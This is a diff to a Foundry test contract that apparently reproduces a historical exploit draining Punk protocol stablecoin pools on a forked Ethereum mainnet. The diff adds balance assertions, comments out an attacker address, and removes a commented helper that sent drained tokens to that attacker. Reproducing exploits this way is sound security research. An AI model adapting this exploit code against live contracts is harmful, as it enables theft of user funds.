@@ -40,7 +40,7 @@ contract Exploit_Punk is TestHarness, TokenBalanceTracker {
         0xc9309a6121cE122c3FB3F7AA8920fb4CBd5fBEEC  // DAI
     ];
 
-    address internal attackerEOA = address(0x69);
+    // address internal attackerEOA = address(0x69);
 
     function setUp() external {
         cheat.createSelectFork('mainnet', 12995894);
@@ -50,7 +50,7 @@ contract Exploit_Punk is TestHarness, TokenBalanceTracker {
         addTokensToTracker(tokens);
 
         updateBalanceTracker(address(this));
-        updateBalanceTracker(attackerEOA);
+        // updateBalanceTracker(attackerEOA);
         updateBalanceTracker(address(punkUsdc));
         updateBalanceTracker(address(punkUsdt));
         updateBalanceTracker(address(punkDai));
@@ -58,6 +58,11 @@ contract Exploit_Punk is TestHarness, TokenBalanceTracker {
 
     function test_attack() external {
         uint256 punksLen = punks.length;
+
+        uint[3] memory balancesBefore;
+        for (uint8 i = 0; i < tokens.length; i++) {
+            balancesBefore[i] = IERC20(tokens[i]).balanceOf(address(this));
+        }
 
         for(uint256 i = 0; i < punksLen; i ++) {
             console.log('===== Draining %s pool =====', IERC20(tokens[i]).name());
@@ -67,9 +72,13 @@ contract Exploit_Punk is TestHarness, TokenBalanceTracker {
                 cTokens[i],
                 forgeProxies[i]
             );
-
-            // deposit(tokens[i]);
         }
+
+        for (uint8 i = 0; i < tokens.length; i++) {
+            assertGe(IERC20(tokens[i]).balanceOf(address(this)), balancesBefore[i]);
+        }
+
+
     }
 
     function attackAPunk(address _punk, address _token, address _cToken, address _forgeProxy) internal {
@@ -101,12 +110,4 @@ contract Exploit_Punk is TestHarness, TokenBalanceTracker {
             0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D  // Uniswap V2 Router
         );
     }
-
-    // The name of this function is retrieved by the traces.
-    // function deposit(address _token) internal {
-    //     IERC20 token = IERC20(_token);
-
-    //     token.transfer(attackerEOA, token.balanceOf(address(this)));
-    // }
-
 }
